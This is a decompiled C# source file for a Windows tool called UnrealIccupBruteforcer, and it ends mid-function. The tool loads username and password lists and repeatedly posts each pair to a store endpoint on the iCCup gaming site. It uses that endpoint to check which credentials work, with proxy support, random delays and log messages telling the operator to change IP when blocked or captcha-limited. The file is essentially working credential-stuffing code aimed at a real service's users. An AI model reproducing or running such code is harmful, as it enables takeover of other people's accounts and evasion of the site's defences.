// Decompiled with JetBrains decompiler
// Type: UnrealIccupBruteforcer.GForm0
// Assembly: UnrealIccupBruteforcer, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E6E7BBA8-DFA2-4C69-A36D-873EA3E30432
// Assembly location: C:\Users\Karaulov\AppData\Roaming\Skype\My Skype Received Files\Brute[goshanvartanov].exe

using UnrealIccupBruteforcer;
using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace UnrealIccupBruteforcer
{
    public class AbsolBruter : Form
    {
        public static System.IO.Stream SoundStream = AllResources.bad_sound1;
        public static System.Media.SoundPlayer SoundPlayer = new System.Media.SoundPlayer(SoundStream);
        public const int WM_NCHITTEST = 132;
        public const int HTCLIENT = 1;
        public const int HTCAPTION = 2;
        public CookieContainer cookieContainer_0;
        public Bitmap exitbitmap;
        public Bitmap traybitmap;
        public Bitmap checkbitmap;
        public Bitmap bitmap_0;
        public Bitmap bitmap_1;
        public int CurPokeX;
        public Point mousemove;
        public bool mousedown;
        public bool checkedswapmode;
        public int latency;
        public bool loggedin;
        public bool checkbuttonneedenable;
        public int CurCount;
        public int CurTryCount;
        public List<string> usernameslist;
        public List<string> passwordslist;
        public int errorcount;
        public List<string> goodlist;
        public bool working;
        public bool pause;
        public WebProxy proxy;
        public PictureBox PokePictBox;
        public System.Windows.Forms.Timer PokeGoTimer;
        public PictureBox ExitButton;
        public PictureBox TrayButton;
        public TextBox BruteUsername;
        public TextBox BrutePassword;
        public PictureBox CheckButton;
        public Label label1;
        public Label label2;
        public Label label3;
        public PictureBox SwapMode;
        public Button UsernamesForBrute;
        public Button PasswordForBrute;
        public System.Windows.Forms.Timer SwapLoginTypeTimer;
        public TextBox SeparatorLP;
        public Label LabelM1;
        public Button LoadNickPwdSeperated;
        public Label LabelM3;
        public Label LabelM2;
        public Label label4;
        public Label label6;
        public Label UsersCount;
        public FuckListBox LogMyBox;
        public PictureBox BaseLoaded;
        public PictureBox LoginIccupGetted;
        public PictureBox RunnedBrute;
        public Label label7;
        public Label label8;
        public Label label9;
        public Label label10;
        public Label PcEnd;
        public Button PauseButton;
        public Button StartButton;
        public NotifyIcon BruTray;
        private IContainer components;
        public Label label5;
        public Label CurrentLogin;
        public Label label12;
        public Label CurrentPassword;
        public TextBox MyProxy;

        protected override void WndProc(ref Message message)
        {
            base.WndProc(ref message);
            if (message.Msg != 132 || (int)message.Result != 1)
                return;
            message.Result = (IntPtr)2;
        }

        public AbsolBruter()
        {

            cookieContainer_0 = new CookieContainer();
            exitbitmap = AllResources.ExitButton;
            traybitmap = AllResources.TrayBtn;
            checkbitmap = AllResources.CheckBtn;
            bitmap_0 = AllResources.MegoCheckBoxFirstpart;
            bitmap_1 = AllResources.MegoCheckBox;
            latency = 1000;
            checkbuttonneedenable = true;
            errorcount = 5;
            proxy = new WebProxy();
            try
            {
                InitializeComponent();
                mousemove = new Point();
                usernameslist = new List<string>();
                passwordslist = new List<string>();
                goodlist = new List<string>();
                SetStyle(ControlStyles.SupportsTransparentBackColor, true);
                exitbitmap = new Bitmap(ExitButton.BackgroundImage);
                traybitmap = new Bitmap(TrayButton.BackgroundImage);
                Bitmap bitmap = new Bitmap(bitmap_0.Width, bitmap_1.Height);
                using (Graphics graphics = Graphics.FromImage((Image)bitmap))
                {
                    graphics.Clear(Color.Transparent);
                    if (checkedswapmode)
                    {
                        graphics.DrawImage((Image)bitmap_0, 0, (unchecked(bitmap_1.Height / 2) - unchecked(bitmap_0.Height / 2)));
                        graphics.DrawImage((Image)bitmap_1, (bitmap_0.Width - bitmap_1.Width), 0);
                    }
                    else
                    {
                        graphics.DrawImage((Image)bitmap_0, 0, (unchecked(bitmap_1.Height / 2) - unchecked(bitmap_0.Height / 2)));
                        graphics.DrawImage((Image)bitmap_1, 0, 0);
                    }
                }
                SwapMode.BackgroundImage = (Image)bitmap;
            }
            catch
            {
            }

            SoundPlayer.Play();
        }

        public void PokeGoTimer_Tick(object sender, EventArgs e)
        {
            LogMyBox.Refresh();
            Bitmap bitmap = new Bitmap(AllResources.PokeLine.Width, AllResources.PokeLine.Height);
            using (Graphics graphics = Graphics.FromImage((Image)bitmap))
            {
                graphics.DrawImage((Image)AllResources.PokeLine, CurPokeX, 0, AllResources.PokeLine.Width, AllResources.PokeLine.Height);
                graphics.DrawImage((Image)AllResources.PokeLine, (CurPokeX + AllResources.PokeLine.Width), 0, AllResources.PokeLine.Width, AllResources.PokeLine.Height);
            }
             { CurPokeX -= 1; }
            if (CurPokeX < (-AllResources.PokeLine.Width))
                CurPokeX = 0;
            if (CurPokeX > AllResources.PokeLine.Width)
                CurPokeX = 0;
            PokePictBox.Image = (Image)bitmap;
        }

        public void ExitButtonUpdate(int need)
        {
            if (need == 1)
                ExitButton.BackgroundImage = (Image)new Bitmap((Image)exitbitmap, new Size((exitbitmap.Width + 5), (exitbitmap.Height + 5)));
            else if (need == 2)
                ExitButton.BackgroundImage = (Image)new Bitmap((Image)exitbitmap, new Size((exitbitmap.Width - 5), (exitbitmap.Height - 5)));
            else
                ExitButton.BackgroundImage = (Image)new Bitmap((Image)exitbitmap);
        }

        public void ExitButton_MouseEnter(object sender, EventArgs e)
        {
            ExitButtonUpdate(1);
        }

        public void ExitButton_MouseLeave(object sender, EventArgs e)
        {
            ExitButtonUpdate(0);
        }

        public void ExitButton_MouseDown(object sender, MouseEventArgs e)
        {
            ExitButtonUpdate(2);
        }

        public void ExitButton_MouseUp(object sender, MouseEventArgs e)
        {
            ExitButtonUpdate(1);
        }

        public void TrayButtonUpdate(int need)
        {
            if (need == 1)
                TrayButton.BackgroundImage = (Image)new Bitmap((Image)traybitmap, new Size((traybitmap.Width + 5), (traybitmap.Height + 5)));
            else if (need == 2)
                TrayButton.BackgroundImage = (Image)new Bitmap((Image)traybitmap, new Size((traybitmap.Width - 5), (traybitmap.Height - 5)));
            else
                TrayButton.BackgroundImage = (Image)new Bitmap((Image)traybitmap);
        }

        public void TrayButton_MouseDown(object sender, MouseEventArgs e)
        {
            TrayButtonUpdate(2);
        }

        public void TrayButton_MouseUp(object sender, MouseEventArgs e)
        {
            TrayButtonUpdate(1);
        }

        public void TrayButton_MouseEnter(object sender, EventArgs e)
        {
            TrayButtonUpdate(1);
        }

        public void TrayButton_MouseLeave(object sender, EventArgs e)
        {
            TrayButtonUpdate(0);
        }

        public void ExitButton_Click(object sender, EventArgs e)
        {
            Environment.Exit(0);
            Application.Exit();
        }

        public void AbsolFreeBrut3Force_Load(object sender, EventArgs e)
        {
            new Thread(new ThreadStart(SendHardwareId)).Start();
            if (System.IO.File.Exists("lastlogin.txt"))
                BruteUsername.Text = System.IO.File.ReadAllText("lastlogin.txt");
            if (!System.IO.File.Exists("lastpwd.txt"))
                return;
            BrutePassword.Text = System.IO.File.ReadAllText("lastpwd.txt");
        }

        public void SwapMode_MouseDown(object sender, MouseEventArgs e)
        {
            mousemove = new Point(SwapMode.PointToClient(Control.MousePosition).X, SwapMode.PointToClient(Control.MousePosition).Y);
            mousedown = true;
        }

        public void SwapMode_MouseUp(object sender, MouseEventArgs e)
        {
            if (!mousedown)
                return;
            mousedown = false;
            if ((mousemove.X + 5) > SwapMode.PointToClient(Control.MousePosition).X && (mousemove.X - 5) < SwapMode.PointToClient(Control.MousePosition).X && ((mousemove.Y + 5) > SwapMode.PointToClient(Control.MousePosition).Y && (mousemove.Y - 5) < SwapMode.PointToClient(Control.MousePosition).Y) || Math.Abs((SwapMode.PointToClient(Control.MousePosition).X - mousemove.X)) < bitmap_0.Height / 2)
                return;
            checkedswapmode = (SwapMode.PointToClient(Control.MousePosition).X - mousemove.X - unchecked(bitmap_0.Height / 2)) > 0;
            Bitmap bitmap = new Bitmap(bitmap_0.Width, bitmap_1.Height);
            using (Graphics graphics = Graphics.FromImage((Image)bitmap))
            {
                graphics.Clear(Color.Transparent);
                if (checkedswapmode)
                {
                    graphics.DrawImage((Image)bitmap_0, 0, (unchecked(bitmap_1.Height / 2) - unchecked(bitmap_0.Height / 2)));
                    graphics.DrawImage((Image)bitmap_1, (bitmap_0.Width - bitmap_1.Width), 0);
                }
                else
                {
                    graphics.DrawImage((Image)bitmap_0, 0, (unchecked(bitmap_1.Height / 2) - unchecked(bitmap_0.Height / 2)));
                    graphics.DrawImage((Image)bitmap_1, 0, 0);
                }
            }
            SwapMode.BackgroundImage = (Image)bitmap;
        }

        public void SwapMode_Click(object sender, EventArgs e)
        {
            if ((mousemove.X + 5) <= SwapMode.PointToClient(Control.MousePosition).X || (mousemove.X - 5) >= SwapMode.PointToClient(Control.MousePosition).X || ((mousemove.Y + 5) <= SwapMode.PointToClient(Control.MousePosition).Y || (mousemove.Y - 5) >= SwapMode.PointToClient(Control.MousePosition).Y))
                return;
            Bitmap bitmap = new Bitmap(bitmap_0.Width, bitmap_1.Height);
            using (Graphics graphics = Graphics.FromImage((Image)bitmap))
            {
                graphics.Clear(Color.Transparent);
                if (!checkedswapmode)
                {
                    checkedswapmode = true;
                    graphics.DrawImage((Image)bitmap_0, 0, (unchecked(bitmap_1.Height / 2) - unchecked(bitmap_0.Height / 2)));
                    graphics.DrawImage((Image)bitmap_1, (bitmap_0.Width - bitmap_1.Width), 0);
                }
                else
                {
                    checkedswapmode = false;
                    graphics.DrawImage((Image)bitmap_0, 0, (unchecked(bitmap_1.Height / 2) - unchecked(bitmap_0.Height / 2)));
                    graphics.DrawImage((Image)bitmap_1, 0, 0);
                }
            }
            SwapMode.BackgroundImage = (Image)bitmap;
        }

        public void SwapMode_DragEnter(object sender, DragEventArgs e)
        {
        }

        public void SwapMode_MouseMove(object sender, MouseEventArgs e)
        {
            if (!mousedown)
                return;
            Bitmap bitmap1 = new Bitmap(bitmap_0.Width, bitmap_1.Height);
            using (Graphics graphics = Graphics.FromImage((Image)bitmap1))
            {
                graphics.Clear(Color.Transparent);
                checkedswapmode = true;
                graphics.DrawImage((Image)bitmap_0, 0, (unchecked(bitmap_1.Height / 2) - unchecked(bitmap_0.Height / 2)));
                graphics.DrawImage((Image)bitmap_1, (SwapMode.PointToClient(Control.MousePosition).X - unchecked(bitmap_1.Height / 2) - 10), 0);
            }
            SwapMode.BackgroundImage = (Image)bitmap1;
            if ((SwapMode.PointToClient(Control.MousePosition).X - unchecked(bitmap_1.Height / 2)) >= 0 && (SwapMode.PointToClient(Control.MousePosition).X - unchecked(bitmap_1.Height / 2) - 10) <= (bitmap_0.Width - 60))
                return;
            mousedown = false;
            if (Math.Abs((SwapMode.PointToClient(Control.MousePosition).X - mousemove.X)) < bitmap_0.Height / 2)
                return;
            checkedswapmode = (SwapMode.PointToClient(Control.MousePosition).X - mousemove.X - unchecked(bitmap_0.Height / 2)) > 0;
            Bitmap bitmap2 = new Bitmap(bitmap_0.Width, bitmap_1.Height);
            using (Graphics graphics = Graphics.FromImage((Image)bitmap2))
            {
                graphics.Clear(Color.Transparent);
                if (checkedswapmode)
                {
                    graphics.DrawImage((Image)bitmap_0, 0, (unchecked(bitmap_1.Height / 2) - unchecked(bitmap_0.Height / 2)));
                    graphics.DrawImage((Image)bitmap_1, (bitmap_0.Width - bitmap_1.Width), 0);
                }
                else
                {
                    graphics.DrawImage((Image)bitmap_0, 0, (unchecked(bitmap_1.Height / 2) - unchecked(bitmap_0.Height / 2)));
                    graphics.DrawImage((Image)bitmap_1, 0, 0);
                }
            }
            SwapMode.BackgroundImage = (Image)bitmap2;
        }

        public void SwapMode_MouseLeave(object sender, EventArgs e)
        {
            if (!mousedown)
                return;
            mousedown = false;
            if (Math.Abs((SwapMode.PointToClient(Control.MousePosition).X - mousemove.X)) <= bitmap_0.Height / 2)
                return;
            checkedswapmode = (unchecked(bitmap_0.Height / 2) - SwapMode.PointToClient(Control.MousePosition).X - mousemove.X) < 0;
            Bitmap bitmap = new Bitmap(bitmap_0.Width, bitmap_1.Height);
            using (Graphics graphics = Graphics.FromImage((Image)bitmap))
            {
                graphics.Clear(Color.Transparent);
                if (checkedswapmode)
                {
                    graphics.DrawImage((Image)bitmap_0, 0, (unchecked(bitmap_1.Height / 2) - unchecked(bitmap_0.Height / 2)));
                    graphics.DrawImage((Image)bitmap_1, (bitmap_0.Width - bitmap_1.Width), 0);
                }
                else
                {
                    graphics.DrawImage((Image)bitmap_0, 0, (unchecked(bitmap_1.Height / 2) - unchecked(bitmap_0.Height / 2)));
                    graphics.DrawImage((Image)bitmap_1, 0, 0);
                }
            }
            SwapMode.BackgroundImage = (Image)bitmap;
        }

        public void SwapMode_MouseEnter(object sender, EventArgs e)
        {
            mousemove = SwapMode.PointToClient(Control.MousePosition);
        }

        public void CheckButtonUpdate(int need)
        {
            if (need == 1)
            {
                CheckButton.BackgroundImage = (Image)null;
                CheckButton.BackgroundImage = (Image)new Bitmap((Image)checkbitmap, new Size((checkbitmap.Width + 5), (checkbitmap.Height + 5)));
            }
            else if (need == 2)
            {
                CheckButton.BackgroundImage = (Image)null;
                CheckButton.BackgroundImage = (Image)new Bitmap((Image)checkbitmap, new Size((checkbitmap.Width - 5), (checkbitmap.Height - 5)));
            }
            else
            {
                CheckButton.BackgroundImage = (Image)null;
                CheckButton.BackgroundImage = (Image)new Bitmap((Image)checkbitmap);
            }
        }

        public void CheckButton_MouseEnter(object sender, EventArgs e)
        {
            CheckButtonUpdate(1);
        }

        public void CheckButton_MouseLeave(object sender, EventArgs e)
        {
            CheckButtonUpdate(0);
        }

        public void CheckButton_MouseDown(object sender, MouseEventArgs e)
        {
            CheckButtonUpdate(2);
        }

        public void CheckButton_MouseUp(object sender, MouseEventArgs e)
        {
            CheckButtonUpdate(1);
        }

        public void SetLoginAndStartLatency()
        {
            if (!IsAllOkay())
            {
                AddLogBoxItem("Все плохо!");
                checkbuttonneedenable = true;
            }
            else
            {
                string text1 = BruteUsername.Text;
                string text2 = BrutePassword.Text;
                cookieContainer_0 = new CookieContainer();
                DateTime now = DateTime.Now;
                try
                {
                    HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create("https://iccup.com/login/gologin.html");
                    httpWebRequest.Method = "POST";
                    httpWebRequest.Referer = "https://iccup.com/login.html";
                    httpWebRequest.UserAgent = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2334.0 Safari/537.36";
                    httpWebRequest.ServicePoint.Expect100Continue = false;
                    httpWebRequest.ContentType = "keep-alive";
                    httpWebRequest.CookieContainer = cookieContainer_0;
                    httpWebRequest.Proxy = (IWebProxy)proxy;
                    httpWebRequest.ContentType = "application/x-www-form-urlencoded";
                    httpWebRequest.Headers["Origin"] = "https://iccup.com";
                    httpWebRequest.Headers.Add("Upgrade-Insecure-Requests", "1");
                    byte[] bytes = Encoding.UTF8.GetBytes("login=" + text1 + "&passw=" + text2 + "&dologin=%D0%A1%D0%B5%D0%B7%D0%B0%D0%BC%2C+%D0%BE%D1%82%D0%BA%D1%80%D0%BE%D0%B9%D1%81%D1%8F%21");
                    httpWebRequest.ContentLength = (long)bytes.Length;
                    Stream requestStream = httpWebRequest.GetRequestStream();
                    requestStream.Write(bytes, 0, bytes.Length);
                    requestStream.Close();
                    HttpWebResponse response = (HttpWebResponse)httpWebRequest.GetResponse();
                    new StreamReader(response.GetResponseStream()).ReadToEnd();
                    cookieContainer_0.Add(response.Cookies);
                }
                catch
                {
                    loggedin = false;
                    latency = 1000;
                    AddLogBoxItem("Ошибка получения логина, ждать 20 сек!");
                    checkbuttonneedenable = true;
                    return;
                }
                Hashtable hashtable = (Hashtable)cookieContainer_0.GetType().InvokeMember("m_domainTable", BindingFlags.Instance | BindingFlags.NonPublic | BindingFlags.GetField, (Binder)null, (object)cookieContainer_0, new object[0]);
                loggedin = false;
                foreach (string key in (IEnumerable)hashtable.Keys)
                {
                    string str = key;
                    if (str != null)
                    {
                        if ((int)str[0] == 46)
                            str = str.Remove(0, 1);
                        foreach (Cookie cookie in cookieContainer_0.GetCookies(new Uri(string.Format("https://{0}/", (object)str))))
                        {
                            if (cookie.Name.IndexOf("last") > -1)
                                loggedin = true;
                        }
                    }
                }
                latency = ((int)(DateTime.Now - now).TotalMilliseconds);
                checkbuttonneedenable = true;
            }
        }

        public void CheckButton_Click(object sender, EventArgs e)
        {
            checkbuttonneedenable = false;
            SetLoginAndStartLatency();
        }

        public void SwapLoginTypeTimer_Tick(object sender, EventArgs e)
        {
            if (AbsolBruter.GlobalVars.BruteBase.Count > 0)
            {
                int count = AbsolBruter.GlobalVars.BruteBase.Count;
                int num = 0;
                int index = 0;
                while (index < AbsolBruter.GlobalVars.BruteBase.Count)
                {
                    if (AbsolBruter.GlobalVars.BruteBase[index].Requested)
                         { ++num; }
                     { ++index; }
                }
                PcEnd.Text = Convert.ToInt32(Convert.ToDouble(num) / Convert.ToDouble(count) * Convert.ToDouble(100)).ToString() + "%";
            }
            else
                PcEnd.Text = "0%";
            if (checkbuttonneedenable)
                CheckButton.Enabled = true;
            else
                CheckButton.Enabled = false;
            if (working && !pause)
                RunnedBrute.BackgroundImage = (Image)AllResources.okay;
            else
                RunnedBrute.BackgroundImage = (Image)AllResources.Bad;
            UsersCount.Text = CurCount.ToString() + " из " + AbsolBruter.GlobalVars.BruteBase.Count.ToString() + " (" + CurTryCount.ToString() + ")";
            if (AbsolBruter.GlobalVars.BruteBase.Count > 0)
                BaseLoaded.BackgroundImage = (Image)AllResources.okay;
            else
                BaseLoaded.BackgroundImage = (Image)AllResources.Bad;
            if (loggedin)
                LoginIccupGetted.BackgroundImage = (Image)AllResources.okay;
            else
                LoginIccupGetted.BackgroundImage = (Image)AllResources.Bad;
            if (checkedswapmode)
            {
                UsernamesForBrute.Visible = false;
                PasswordForBrute.Visible = false;
                LabelM1.Visible = true;
                LabelM2.Visible = true;
                LabelM3.Visible = true;
                LoadNickPwdSeperated.Visible = true;
                SeparatorLP.Visible = true;
            }
            else
            {
                UsernamesForBrute.Visible = true;
                PasswordForBrute.Visible = true;
                LabelM1.Visible = false;
                LabelM2.Visible = false;
                LabelM3.Visible = false;
                LoadNickPwdSeperated.Visible = false;
                SeparatorLP.Visible = false;
            }
        }

        public void AddLogBoxItem(string item)
        {
            if (!System.IO.File.Exists("logfile.log"))
                System.IO.File.Create("logfile.log").Close();
            System.IO.File.WriteAllLines("logfile.log", new List<string>((IEnumerable<string>)System.IO.File.ReadAllLines("logfile.log"))
      {
        item
      }.ToArray());

            LogMyBox.Invoke(new Action(() => LogMyBox.Items.Insert(3, (object)item)));
        }

        public void TrayButton_Click(object sender, EventArgs e)
        {
            WindowState = FormWindowState.Minimized;
        }

        public string[] getdata(string data)
        {
            return data.Split(new string[1]
            {
        SeparatorLP.Text
            }, StringSplitOptions.None);
        }

        public void LoadNickPwdSeperated_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Filter = "USERNAME : PASSWOD List|*.*";
            openFileDialog.Multiselect = false;
            if (openFileDialog.ShowDialog() != DialogResult.OK)
                return;
            string[] strArray = System.IO.File.ReadAllLines(openFileDialog.FileName);
            AbsolBruter.GlobalVars.BruteBase.Clear();
            int index = 0;
            while (index < strArray.Length)
            {
                try
                {
                    if (getdata(strArray[index])[1].Length > 5)
                    {
                        if (getdata(strArray[index])[1].Length < 16)
                        {
                            if (getdata(strArray[index])[0].Length > 2)
                            {
                                if (getdata(strArray[index])[0].Length < 13)
                                {
                                    AbsolBruter.GlobalVars.BruteBaseStruct bruteBaseStruct = new AbsolBruter.GlobalVars.BruteBaseStruct(getdata(strArray[index])[0], getdata(strArray[index])[1], false);
                                    AbsolBruter.GlobalVars.BruteBase.Add(bruteBaseStruct);
                                }
                            }
                        }
                    }
                }
                catch
                {
                    AddLogBoxItem("Ошибка чтения файла username:password !");
                }
                 { ++index; }
            }
        }

        public void AbsolFreeBrut3Force_Resize(object sender, EventArgs e)
        {
            if (FormWindowState.Minimized == WindowState)
            {
                BruTray.Visible = true;
                BruTray.ShowBalloonTip(500);
                Visible = false;
            }
            else
            {
                if (WindowState != FormWindowState.Normal)
                    return;
                BruTray.Visible = false;
                Visible = true;
            }
        }

        public void BruTray_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            Visible = true;
            WindowState = FormWindowState.Normal;
        }

        public void UsernamesForBrute_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Filter = "Username List|*.*";
            openFileDialog.Multiselect = false;
            if (openFileDialog.ShowDialog() != DialogResult.OK)
                return;
            string[] strArray = System.IO.File.ReadAllLines(openFileDialog.FileName);
            usernameslist.Clear();
            int index1 = 0;
            while (index1 < strArray.Length)
            {
                if (strArray[index1].Length > 2 && strArray[index1].Length < 16)
                    usernameslist.Add(strArray[index1]);
                 { ++index1; }
            }
            if (passwordslist.Count <= 0 || usernameslist.Count <= 0)
                return;
            AbsolBruter.GlobalVars.BruteBase.Clear();
            int index2 = 0;
            while (index2 < passwordslist.Count)
            {
                int index3 = 0;
                while (index3 < usernameslist.Count)
                {
                    AbsolBruter.GlobalVars.BruteBaseStruct bruteBaseStruct = new AbsolBruter.GlobalVars.BruteBaseStruct(usernameslist[index3], passwordslist[index2], false);
                    AbsolBruter.GlobalVars.BruteBase.Add(bruteBaseStruct);
                     { ++index3; }
                }
                 { ++index2; }
            }
        }

        public void PasswordForBrute_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Filter = "Passwords List|*.*";
            openFileDialog.Multiselect = false;
            if (openFileDialog.ShowDialog() != DialogResult.OK)
                return;
            string[] strArray = System.IO.File.ReadAllLines(openFileDialog.FileName);
            passwordslist.Clear();
            int index1 = 0;
            while (index1 < strArray.Length)
            {
                if (strArray[index1].Length > 5 && strArray[index1].Length < 13)
                    passwordslist.Add(strArray[index1]);
                 { ++index1; }
            }
            if (passwordslist.Count <= 0 || usernameslist.Count <= 0)
                return;
            AbsolBruter.GlobalVars.BruteBase.Clear();
            int index2 = 0;
            while (index2 < passwordslist.Count)
            {
                int index3 = 0;
                while (index3 < usernameslist.Count)
                {
                    AbsolBruter.GlobalVars.BruteBaseStruct bruteBaseStruct = new AbsolBruter.GlobalVars.BruteBaseStruct(usernameslist[index3], passwordslist[index2], false);
                    AbsolBruter.GlobalVars.BruteBase.Add(bruteBaseStruct);
                     { ++index3; }
                }
                 { ++index2; }
            }
        }

        public static string identifier(string wmiClass, string wmiProperty)
        {
            string str = "";
            foreach (ManagementObject instance in new ManagementClass(wmiClass).GetInstances())
            {
                if (str == "")
                {
                    try
                    {
                        str = instance[wmiProperty].ToString();
                        break;
                    }
                    catch
                    {
                    }
                }
            }
            return str;
        }

        public static string cpuId()
        {
            string str1 = AbsolBruter.identifier("Win32_Processor", "UniqueId");
            if (str1 == "")
            {
                str1 = AbsolBruter.identifier("Win32_Processor", "ProcessorId");
                if (str1 == "")
                {
                    string str2 = AbsolBruter.identifier("Win32_Processor", "Name");
                    if (str2 == "")
                        str2 = AbsolBruter.identifier("Win32_Processor", "Manufacturer");
                    str1 = str2 + AbsolBruter.identifier("Win32_Processor", "MaxClockSpeed");
                }
            }
            return str1;
        }

        public string GetUserName()
        {
            string str = "-EMANON-";
            try
            {
                str = WindowsIdentity.GetCurrent().Name;
            }
            catch
            {
            }
            return str;
        }

        public static string ReverseStr(string s)
        {
            char[] charArray = s.ToCharArray();
            Array.Reverse((Array)charArray);
            return new string(charArray);
        }

        public void SendHardwareId()
        {
            Thread.Sleep(3000);
        }

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool FreeLibrary(IntPtr hModule);

        public bool IsAllOkay()
        {
            return true;
        }

        public bool CheckProxy(WebProxy proxy)
        {
            try
            {
                HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create("https://iccup.com");
                httpWebRequest.Method = "POST";
                httpWebRequest.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;
                httpWebRequest.Referer = "https://iccup.com";
                httpWebRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36";
                httpWebRequest.CookieContainer = new CookieContainer();
                httpWebRequest.ContentType = "application/x-www-form-urlencoded";
                httpWebRequest.Timeout = 3000;
                httpWebRequest.Proxy = (IWebProxy)proxy;
                string str = "                                          ";
                StreamWriter streamWriter = new StreamWriter(httpWebRequest.GetRequestStream());
                streamWriter.Write(str);
                streamWriter.Close();
                HttpWebResponse response = (HttpWebResponse)httpWebRequest.GetResponse();
                StreamReader streamReader = new StreamReader(response.GetResponseStream());
                streamReader.ReadToEnd();
                if (httpWebRequest.CookieContainer.Count > 0 && response.StatusCode == HttpStatusCode.OK)
                {
                    response.Close();
                    streamReader.Close();
                    return true;
                }
                response.Close();
                streamReader.Close();
                return false;
            }
            catch
            {
            }
            return false;
        }

        public void SingleThreadBruter()
        {
            string str1 = "";
            string str2 = "";
            working = true;
            int num1 = 100;
            int num2 = 10;
            int index1 = 0;
            while (index1 < AbsolBruter.GlobalVars.BruteBase.Count)
            {
                while (!AbsolBruter.GlobalVars.BruteBase[index1].Requested)
                {
                     { ++CurTryCount; }
                     { --num1; }
                    if (!loggedin)
                    {
                        AddLogBoxItem("Жду 20 сек и пробую снова.");
                        Thread.Sleep(100);
                        AddLogBoxItem("перезапустите модем.(нужен новый IP)");
                        Thread.Sleep(100);
                        AddLogBoxItem("Введите новый iCCup логин или");
                        Thread.Sleep(100);
                        AddLogBoxItem("Возможно появилась капча.");
                        Thread.Sleep(100);
                        AddLogBoxItem("Ваш iCCup логин не действителен!");
                        Thread.Sleep(20000);
                        checkbuttonneedenable = false;
                        SetLoginAndStartLatency();
                    }
                    else
                    {
                        if (num1 < 0)
                        {
                            num1 = 98;
                             { --num2; }
                            if (num2 < 0)
                            {
                                num2 = 10;
                                string path = "LastBruteDataDump.txt";
                                if (!System.IO.File.Exists(path))
                                {
                                    System.IO.File.Create(path).Close();
                                }
                                else
                                {
                                    System.IO.File.Delete(path);
                                    System.IO.File.Create(path).Close();
                                }
                                List<string> stringList = new List<string>();
                                int index2 = 0;
                                while (index2 < AbsolBruter.GlobalVars.BruteBase.Count)
                                {
                                    if (!AbsolBruter.GlobalVars.BruteBase[index2].Requested)
                                        stringList.Add(AbsolBruter.GlobalVars.BruteBase[index2].username + SeparatorLP.Text + AbsolBruter.GlobalVars.BruteBase[index2].password);
                                     { ++index2; }
                                }
                                System.IO.File.WriteAllLines(path, stringList.ToArray());
                            }
                            Thread.Sleep((2500 + new Random().Next(1, 1000)));
                        }
                        while (pause)
                            Thread.Sleep(500);
                        pause = true;
                        while (!IsAllOkay())
                        {
                            pause = true;
                            Thread.Sleep(5000);
                        }
                        pause = false;
                        string username = AbsolBruter.GlobalVars.BruteBase[index1].username.Trim();
                        string password = AbsolBruter.GlobalVars.BruteBase[index1].password.Trim();
                        string end;
                        Uri responseUri;
                        try
                        {
                            HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create("https://iccup.com/store/buyItem/19/final/");
                            httpWebRequest.Method = "POST";
                            httpWebRequest.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;
                            httpWebRequest.Referer = "https://iccup.com/store/buyItem/19/step1.html";
                            httpWebRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36";
                            httpWebRequest.CookieContainer = cookieContainer_0;
                            httpWebRequest.ContentType = "application/x-www-form-urlencoded";
                            httpWebRequest.Headers.Add("DNT", "1");
                            httpWebRequest.Headers.Add("Accept-Encoding", "gzip, deflate");
                            httpWebRequest.Headers.Add("Origin", "https://iccup.com");
                            httpWebRequest.Headers.Add("Upgrade-Insecure-Requests", "1");

                            string str3 = "ladder=5&nickname=" + username + "&password=" + password;
                            try
                            {
                                CurrentLogin.Text = username;
                                CurrentPassword.Text = password;
                            }
                            catch
                            {

                            }

                            httpWebRequest.ReadWriteTimeout = 5000;
                            httpWebRequest.Timeout = 5000;
                            httpWebRequest.Proxy = (IWebProxy)proxy;
                            StreamWriter streamWriter = new StreamWriter(httpWebRequest.GetRequestStream());
                            streamWriter.Write(str3);
                            streamWriter.Close();
                            //Thread.Sleep(100);
                            HttpWebResponse response = (HttpWebResponse)httpWebRequest.GetResponse();
                            Stream responseStream = response.GetResponseStream();
                            StreamReader streamReader = new StreamReader(responseStream);
                            end = streamReader.ReadToEnd();
                            streamReader.Close();
                            responseStream.Close();
                            responseUri = response.ResponseUri;
                            response.Close();
                        }
                        catch (WebException ex)
                        {
                            AddLogBoxItem("Bad request. " + ex.Message);
                            AddLogBoxItem("Sleep 20000 sec and start.");
                            Thread.Sleep(20000);
                            checkbuttonneedenable = false;
                            SetLoginAndStartLatency();
                            continue;
                        }
                        catch
                        {
                            AddLogBoxItem("Bad request.");
                            AddLogBoxItem(" Username:" + username + ", Password:" + password);
                            AddLogBoxItem("Sleep 10000 sec and start.");
                            Thread.Sleep(10000);
                            checkbuttonneedenable = false;
                            SetLoginAndStartLatency();
                            continue;
                        }
                        try
                        {
                            if (end != null && !(responseUri == (Uri)null) && (end.Length >= 200 && responseUri.AbsolutePath != null))
                            {
                                /*File.AppendAllText("test.log", end);
                                File.AppendAllText("test.log", "\n\n\n\n\n\n\n");
